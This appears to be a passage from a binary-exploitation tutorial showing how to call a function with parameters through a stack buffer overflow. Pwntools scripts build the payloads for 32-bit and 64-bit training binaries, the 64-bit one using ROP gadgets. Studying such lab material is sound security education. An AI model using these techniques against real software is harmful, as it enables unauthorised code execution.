### 32-bit

The program expects the stack to be laid out like this before executing the function:

```text
return pointer    param1    param2    param3
```

So why don't we provide it like that? As well as the function, we also pass the return address and the parameters.

```text
<flag address>    <ret. pointer>    <param1>    <param2>
```

Everything after the address of `flag()` will be part of the stack frame for the next function as it is **expected** to be there - just instead of using `push` instructions we just overwrote them manually.

```python
from pwn import *

p = process('./vuln-32')

payload = b'A' * 52            # Padding up to EIP
payload += p32(0x080491c7)     # Address of flag()
payload += p32(0x0)            # Return address - don't care if crashes when done
payload += p32(0xdeadc0de)     # First parameter
payload += p32(0xc0ded00d)     # Second parameter

log.info(p.clean())
p.sendline(payload)
log.info(p.clean())
```

### 64-bit

Same logic, except we have to utilise the gadgets we talked about previously to fill the required registers \(in this case `rdi` and `rsi` as we have two parameters\).

We have to fill the registers _before_ the function is called

```python
from pwn import *

p = process('./vuln-64')

POP_RDI, POP_RSI_R15 = 0x4011fb, 0x4011f9


payload = b'A' * 56            # Padding
payload += p64(POP_RDI)        # pop rdi; ret
payload += p64(0xdeadc0de)     # value into rdi -> first param
payload += p64(POP_RSI_R15)    # pop rsi; pop r15; ret
payload += p64(0xc0ded00d)     # value into rsi -> first param
payload += p64(0x0)            # value into r15 -> not important
payload += p64(0x40116f)       # Address of flag()

log.info(p.clean())
p.sendline(payload)
log.info(p.clean())
```
